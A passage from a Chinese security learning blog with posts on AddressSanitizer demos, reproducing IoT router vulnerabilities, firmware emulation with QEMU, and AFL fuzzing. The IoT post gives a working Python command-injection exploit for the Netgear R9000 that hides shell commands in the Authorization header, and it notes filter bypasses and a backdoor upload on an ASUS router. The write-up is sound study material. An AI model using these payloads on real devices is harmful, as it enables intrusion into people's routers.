overflow类似，就不细讲了</p><p>demo</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *heap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-type">char</span> test =  heap[<span class="hljs-number">0x10</span>];<br>  <br>  <span class="hljs-built_in">free</span>(heap);<br>  *heap = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ASAN_log</p><p><img src="/img/ASAN/5.png" alt="img"></p><h2 id="global-buffer-overflow"><a href="#global-buffer-overflow" class="headerlink" title="global buffer overflow"></a>global buffer overflow</h2><p>同上</p><p>demo:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">char</span> global[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> global[<span class="hljs-number">0x10</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>但是ASAN_log很奇怪</p><p><img src="/img/ASAN/6.png" alt="img"></p><p>特别是明明gloabl才0x10个字节大小，shadow memory前面那么大一块区域</p><p>且当我将当demo 换成<code>return global[-1]</code>时，直接显示正常了。</p><p>？？？</p><p>如果有师傅知道是什么情况能不能联系一下铸币笔者呜呜</p><p>跪谢</p><h2 id="use-after-free"><a href="#use-after-free" class="headerlink" title="use after free"></a>use after free</h2><p>demo:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *heap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br> <br>  <span class="hljs-built_in">free</span>(heap);<br>  <span class="hljs-keyword">return</span> heap[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>ASAN_log</p><p><img src="/img/ASAN/7.png" alt="img"></p><h2 id="memory-leak"><a href="#memory-leak" class="headerlink" title="memory leak"></a>memory leak</h2><p>内存泄露其实就是内存分配后没有释放，导致内存空间中有数据残留</p><p>demo:</p><p>没有free掉堆块</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *heap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ASAN_log</p><p><img src="/img/ASAN/8.png" alt="img"></p><h2 id="stack-use-after-scope"><a href="#stack-use-after-scope" class="headerlink" title="stack use after scope"></a>stack use after scope</h2><p>stack-use-after-scope指的是超出定义域外对局部变量操作</p><p>demo:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> *p = <span class="hljs-number">0</span>;<br>  <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  &#123;<br>    <span class="hljs-type">int</span> test = <span class="hljs-number">0</span>;<br>    p = &amp;test;<br>  &#125;<br>  <br>  *p = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先用volatile指定一下指针p每次操作前都重新读一下值</p><p>ASAN_log</p><p><img src="/img/ASAN/9.png" alt="img"></p><h2 id="stack-use-after-return"><a href="#stack-use-after-return" class="headerlink" title="stack use after return"></a>stack use after return</h2><p>和stack-use-after-scope类似</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">char</span> *p;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>  p = &amp;buffer[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">func</span>();<br>  <span class="hljs-keyword">return</span> p[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>但是ASAN默认是不检测这个错误的，所以要使用<code>ASAN_OPTIONS=detect_stack_use_after_return=1</code>开启</p><p>ASAN_log</p><p><img src="/img/ASAN/10.png" alt="img"></p><h1 id="0x3-一些小bug"><a href="#0x3-一些小bug" class="headerlink" title="0x3: 一些小bug"></a>0x3: 一些小bug</h1><p>一：</p><p>可以看到，针对溢出类型的漏洞时，ASAN在shadow memory ‘s left or right投毒的区域是有限的，若溢出的范围超出投毒的范围或者恰好落在别的可用内存对应的shadow memory，则不会报错</p><p>二：</p><p>众所周知，例如在x86_64进行堆块分配时，一个chunk的前8个字节是可以被前一chunk使用的，但这却会被ASAN检测出heap overflow</p><p><img src="/img/ASAN/11.png" alt="img"></p><p>三：</p><p>当内存分配未8字节对齐时</p><p><img src="/img/ASAN/12.png" alt="img"></p><p>可以看到这边有一个shadow memory为<code>04</code>，结合上文所提到的shadow memory的9钟可能值，可知此处有4个字节被投毒</p><h1 id="0x4-最后的最后"><a href="#0x4-最后的最后" class="headerlink" title="0x4: 最后的最后"></a>0x4: 最后的最后</h1><p>花了两天时间大致了解了一下ASAN，总的来说这个工具还是很好用的，虽然有些小问题，但这很大一部分原因是语言导致的。</p><p>其实官方的文档写的超级详细，各位大师傅如果想深入了解ASAN可以直接去google的<a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">仓库</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ASAN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iot漏洞复现小记</title>
    <link href="/2023/08/05/iot%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/05/iot%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0: 写在所有之前"></a>0x0: 写在所有之前</h1><p>直接莽漏洞复现了</p><p>搞了个iotsec的账号，这边复现的主要是里面iot靶场里的洞</p><p>总感觉他TM靶机有大问题，所以笔者这记录的全为本地remake</p><h1 id="0x1-大致的漏洞挖掘流程"><a href="#0x1-大致的漏洞挖掘流程" class="headerlink" title="0x1: 大致的漏洞挖掘流程"></a>0x1: 大致的漏洞挖掘流程</h1><p>笔者希望在这二三十个漏洞复现完后能总结出一个高效率的iot漏洞挖掘流程</p><p>但暂时还没什么灵感呜呜呜呜</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>8-10，July：试了几个后门漏洞，先用firmwalker看看有没有敏感文件</p><p>10-15，July：挖了totolink T10，熟悉了以mqtt为主题的webserver</p><p>17-20，July：totolink A720R，totolink大量存在的未授权认证漏洞，以及以http为主体的webserver，cstecgi.cgi</p><p>8-13，August：Tenda AX3，patch binary of httpd来启动webserver，很正常的服务</p><p>15-17，August：一系列DLINK设备存在的问题，牵扯到upnp协议，用qemu很麻烦，所以笔者直接用FirmAE进行模拟，且FirmAE的-d模式能拿shell和patch pid调试，对于类似cgi这类存在时间很短的进程，winmt师傅的方法是patch掉一个地方，使程序进入无限循环从而使进程卡住，绝妙的想法！！</p><h1 id="0x2-Remake"><a href="#0x2-Remake" class="headerlink" title="0x2: Remake"></a>0x2: Remake</h1><h2 id="后门漏洞"><a href="#后门漏洞" class="headerlink" title="后门漏洞"></a>后门漏洞</h2><p>这种纯纯就是福利姬（好像有点奇怪，但这么说是一点问题没有）</p><h3 id="D-Link-DIR815后门漏洞"><a href="#D-Link-DIR815后门漏洞" class="headerlink" title="D-Link DIR815后门漏洞"></a>D-Link DIR815后门漏洞</h3><p>拿firmwalker一扫发现存在&#x2F;etc&#x2F;init0.d&#x2F;S80telnetd.sh</p><p><img src="/img/iot1/0.png" alt="img"></p><p>然后就telnet访问一下就好了</p><p>抽象的一批</p><h3 id="ASUS-RT-N10-ASUS-RT-N10-D1-授权命令执行漏洞"><a href="#ASUS-RT-N10-ASUS-RT-N10-D1-授权命令执行漏洞" class="headerlink" title="ASUS RT-N10&amp;ASUS RT-N10 D1 授权命令执行漏洞"></a>ASUS RT-N10&amp;ASUS RT-N10 D1 授权命令执行漏洞</h3><p>firmwalker扫完没什么发现</p><p>找一下固件中有没有syscmd这种敏感字符串，还真有</p><p><img src="/img/iot1/1.png" alt="img"></p><p>那用FirmAE模拟一下，试着访问一下这个Main_AdmStatus_Content.asp</p><p><img src="/img/iot1/2.png" alt="img"></p><p>随便搞</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Tenda-AC15命令执行（goform-setUsbUnload）"><a href="#Tenda-AC15命令执行（goform-setUsbUnload）" class="headerlink" title="Tenda AC15命令执行（goform&#x2F;setUsbUnload）"></a>Tenda AC15命令执行（goform&#x2F;setUsbUnload）</h3><p>TendaAC15老朋友了，先把httpd服务起起来</p><p>goform，很眼熟，估计起web服务的是gohead</p><p>漏洞描述都说是在setUsbUnload了，在httpd搜一下字符串</p><p><img src="/img/iot1/3.png" alt="img"></p><p>啊这，没有任何过滤，那就直接搞个POST请求看一下</p><p><img src="/img/iot1/4.png" alt="img"></p><p><img src="/img/iot1/5.png" alt="img"></p><h3 id="DIR818L命令执行-（-etc-script-IPV4-INET-PHP）"><a href="#DIR818L命令执行-（-etc-script-IPV4-INET-PHP）" class="headerlink" title="DIR818L命令执行 （&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHP）"></a>DIR818L命令执行 （&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHP）</h3><p>捏麻麻滴</p><p>审了半天，看了wp才知道是web洞，会不了一点</p><p>而且这个网路服务是HNAP1，SOAP协议的，xml语言看起来挺好懂得，就是这个功能API实在是太折磨了</p><h3 id="ASUS-RT-N10U-（ping-过滤不严）"><a href="#ASUS-RT-N10U-（ping-过滤不严）" class="headerlink" title="ASUS RT-N10U （ping 过滤不严）"></a>ASUS RT-N10U （ping 过滤不严）</h3><p>好像Ping命令检测网络联通性的地方挺容易出现RCE的</p><p>burp抓个包看看是什么情况</p><p><img src="/img/iot1/6.png" alt="img"></p><p>？SystemCmd，那就按照特定字符串搜一下，定位到&#x2F;usr&#x2F;sbin&#x2F;httpd，在里面找到了对应的函数</p><p><img src="/img/iot1/7.png" alt="img"></p><p>sys_script</p><p><img src="/img/iot1/8.png" alt="img"></p><p>可以看到，用get_cgi接受SystemCmd参数后，虽然有一点过滤。但是反引号**&#96; $()**这些内敛执行绕过并没有过滤掉</p><p>将V7拷贝到位于bss段的SystemCmd后，就直接用sys_script直接执行了，所以就是一个很简单的RCE</p><p>传了个msf生成的backdoor</p><p><img src="/img/iot1/9.png" alt="img"></p><h3 id="Netgear-R9000（-cgi-bin登录认证时没有对Authorizationg过滤）"><a href="#Netgear-R9000（-cgi-bin登录认证时没有对Authorizationg过滤）" class="headerlink" title="Netgear R9000（&#x2F;cgi-bin登录认证时没有对Authorizationg过滤）"></a>Netgear R9000（&#x2F;cgi-bin登录认证时没有对Authorizationg过滤）</h3><p>登录认证的时候没有对Authorization进行check</p><p>漏洞可以直接定位到&#x2F;usr&#x2F;sbin&#x2F;uhttpd中的<code>uh_cgi_auth_check</code></p><p><img src="/img/iot1/10.png" alt="img"></p><p>逻辑很简单，接收到Authorization的内容后，把<code>Basic </code>后的内容base64解密，并把password拼接后执行</p><p>本意是想把password的hash值保存到文件中，却因为过滤不严导致rce</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = &quot;http://81.68.182.195:56898/cgi-bin&quot;<br>cmd = base64.b64encode(b&quot;admin:;ls /&gt;/www/cmd.txt;&quot;)<br><br>headers=&#123;<br>    &quot;Host&quot;: &quot;81.68.182.195:56898&quot;,<br>    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,<br>    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36&quot;,<br>    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,<br>    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,<br>    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;,<br>    &quot;Connection&quot;: &quot;keep-alive&quot;,<br>    &quot;Authorization&quot;: b&quot;Basic &quot; + cmd,<br>&#125;<br># payload = &quot;ls &gt;/www/ls.txt&quot;<br># res = requests.<span class="hljs-keyword">get</span>(url=url,auth=(&quot;admin&quot;,payload))<br># print(res.text)<br>res = requests.<span class="hljs-keyword">get</span>(url=url,headers=headers,timeout=<span class="hljs-number">1</span>)<br>print(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/iot1/11.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Iot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>固件模拟指北</title>
    <link href="/2023/07/30/Fuzz1/"/>
    <url>/2023/07/30/Fuzz1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>固件模拟这个玩意笔者也不想多说什么，纯纯的折磨自己，但是还不得不搞（主要是实在是太穷没有米买设备）</p><p>最近把主流的固件模拟方法都过了一遍，于是笔者就想水篇博客顺带记点笔记。</p><p>鉴于固件模拟有各种薛定谔的报错，笔者使用的较为稳定的ubuntu20.04</p><p>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p><h1 id="0x1-框架模拟"><a href="#0x1-框架模拟" class="headerlink" title="0x1:框架模拟"></a>0x1:框架模拟</h1><p>直接工具一把梭哈</p><h2 id="FirmAE-Firmadyne"><a href="#FirmAE-Firmadyne" class="headerlink" title="FirmAE &amp; Firmadyne"></a>FirmAE &amp; Firmadyne</h2><p>这两个没什么好说的，能不能模拟起来纯靠运气</p><p>笔者更倾向于FirmAE一点，主要是懒狗一条，能直接一行command完事的事情谁会想搓一个启动脚本呢</p><p>关于这两个框架的具体信息可以直接在github找</p><p><a href="https://github.com/pr0v3rbs/FirmAE">pr0v3rbs&#x2F;FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis (github.com)</a></p><p><a href="https://github.com/firmadyne/firmadyne">firmadyne&#x2F;firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware (github.com)</a></p><h2 id="Fact-core"><a href="#Fact-core" class="headerlink" title="Fact_core"></a>Fact_core</h2><p>docker拉了两个小时没拉下来，捏麻麻滴，不做评价</p><h1 id="0x2-Qemu模拟"><a href="#0x2-Qemu模拟" class="headerlink" title="0x2:Qemu模拟"></a>0x2:Qemu模拟</h1><p>有一说一虚拟化真的是个神奇的技术，笔者现在也对<strong>Virtualization</strong>逐渐起了兴趣</p><p>言归正传，qemu模拟有两个不同的模式，user模式和system模式，在本篇博客中，两种模式都会详细介绍</p><h2 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu user"></a>qemu user</h2><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>user模式下模拟较为便捷，这边就以典型的<strong>Tenda AC15</strong>来作为例子<a href="(https://www.tenda.com.cn/download/detail-2680.html)">固件下载</a></p><p>先看一下架构（一般都是查看&#x2F;bin&#x2F;busybox），是arm，小端序，动态链接</p><p>且在&#x2F;bin中存在httpd可执行文件，于是我们就可以尝试运行一下httpd</p><p>首先因为httpd是异架构的动态链接，所以模拟的时候最好直接用静态编译的qemu</p><p>先下载qemu-user-static</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span><span class="hljs-operator">-</span><span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure><p>然后找到对应架构的qemu-user-static，复制到当前文件夹下</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">which qemu-arm-<span class="hljs-keyword">static</span><br>cp [path <span class="hljs-keyword">to</span> qemu-arm-<span class="hljs-keyword">static</span>] .``<br></code></pre></td></tr></table></figure><p>将squashfs-root切换为根目录，user模式执行.&#x2F;bin&#x2F;httpd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> . ./qemu-arm-static ./bin/httpd<br></code></pre></td></tr></table></figure><p>执行了，但没完全执行，但至少我们可以确定这样是有可行性的（yes,we love linux!!!)</p><p><img src="/img/FW/0.png" alt="img"></p><p>把httpd拖进ida，根据相应得字符串，看一下是哪边卡住了</p><p>在那边下个断点，然后用IDA远程调式康康什么情况，GDB应该也行</p><p><img src="/img/FW/1.png" alt="img"></p><p>单步步进，看到R0寄存器被赋值0，随后就只能跳转到0x2E514，所以使用keypatch来绕过这个这个检测</p><p><img src="/img/FW/2.png" alt="img"></p><p><img src="/img/FW/3.png" alt="img"></p><p>再执行看看会怎么样</p><p>又寄了，那就再动调一下</p><p><img src="/img/FW/4.png" alt="img"></p><p>可有看到这边又有一个和刚才类似得patch，那就故技重施</p><p><img src="/img/FW/5.png" alt="img"></p><p><img src="/img/FW/6.png" alt="img"></p><p>再次执行，成功了，但没完全成功，255.255.255.255是给人访问的？那只能继续调了</p><p><img src="/img/FW/7.png" alt="img"></p><p>可以看到我们前面的两处patch都是为了执行<strong>ConnectCfm</strong>，接下来便是一些变量的获取</p><p>在<strong>GetLanIfName</strong>之后，猜测**GetValue(“lan.ip”, s);**便是导致ip不正常的罪魁祸首</p><p>那就查看一下外部调用<strong>GetLanIfName</strong></p><p><strong>GetLanIfName</strong>被定义在<strong>lib&#x2F;libcommon.so</strong>中，外部调用了<strong>get_eth_name</strong></p><p><img src="/img/FW/11.png" alt="img"></p><p>外部调用函数<strong>get_eth_name</strong>被定义<strong>lib&#x2F;libChipApi.so</strong>在中，具体function是获取网卡名称，但是本机中无法匹配与之相应的网卡</p><p><img src="/img/FW/8.png" alt="img"></p><p>所以那就起一个名称为<strong>br0</strong>的网卡</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> brctl addbr br0<br><span class="hljs-attribute">sudo</span> ifconfig br0 <span class="hljs-number">192.168.10.144</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>成功！！！</p><p><img src="/img/FW/9.png" alt="img"></p><p>访问一下ip试试</p><p>草，访问失败，香槟开早了</p><p><img src="/img/FW/12.png" alt="img"></p><p>那就只能在启动的时候加上<strong>–strace</strong>参数看看具体执行过程了</p><p>果然，在访问**&#x2F;webroot&#x2F;main.html**时发生了报错</p><p><img src="/img/FW/13.png" alt="img"></p><p>仔细一看webroot这个文件夹是空的，而那些main.html文件全在文件夹webroot_ro中</p><p><img src="/img/FW/14.png" alt="img"></p><p>那就只能把webroot给删了，然后创建一个软连接了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf webroot<br>sudo <span class="hljs-built_in">ln</span> -s webroot_ro/ webroot<br></code></pre></td></tr></table></figure><p>再访问一下，成功！！</p><p><img src="/img/FW/15.png" alt="img"></p><h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><p>这个手法太超前了，等铸币笔者学成归来再说</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu system"></a>qemu system</h2><p>这时候就到了全系统模拟了</p><p>winmt👴的文章中有很详细的流程[<a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p><p>王指导用的是ubuntu20，但我只有ubuntu16能成功起起来</p><p>文章中那个镜像的链接好像有点小问题，笔者这边贴一个<a href="https://files.sboc.dev/images/">images (sboc.dev)</a>，里面还有system模式启动脚本，真的我哭死</p><p>这边还是用Tenda AC15的固件作为示范</p><p>镜像起起来后，保证qemu里的ip能和外网ping通。</p><p>本地开一个http服务或者用scp把squashfs-root传输进去</p><p>使用命令挂载并切换根目录</p><p><img src="/img/FW/16.png" alt="img"></p><p>接下来便是把patch好的httpd替换掉原本的</p><p>设置网卡了br0，但默认的busybox中不存在brctl指令，github上随便找个编译好的arm架构的busybox传进去就行</p><p>启动httpd</p><p><img src="/img/FW/17.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Iot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dig into the afl</title>
    <link href="/2023/07/18/fuzz0/"/>
    <url>/2023/07/18/fuzz0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>在笔者看来，fuzz无疑是一个天才的想法，通过自动化的大量的随机数据测试，进行漏洞挖掘。</p><p>笔者一直很想学习这一方面的知识，在粗略的拜读完<strong>Fuzzing: A Survey for Roadmap</strong>之后，恰好暑假也有点空闲时间（<del>主要是放了两礼拜假什么也没干有点良心不安</del>），便打算从afl入手来学习fuzz。</p><h1 id="0x1-初探"><a href="#0x1-初探" class="headerlink" title="0x1:初探"></a>0x1:初探</h1><p>下载安装什么的网上可以自己找捏wakuwaku</p><p>首先呢可以自己先随遍写一些测试用例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span> </span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="hljs-number">6</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="hljs-number">66</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;L&#x27;</span> &amp;&amp; len == <span class="hljs-number">666</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; OK ,it is safe&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span 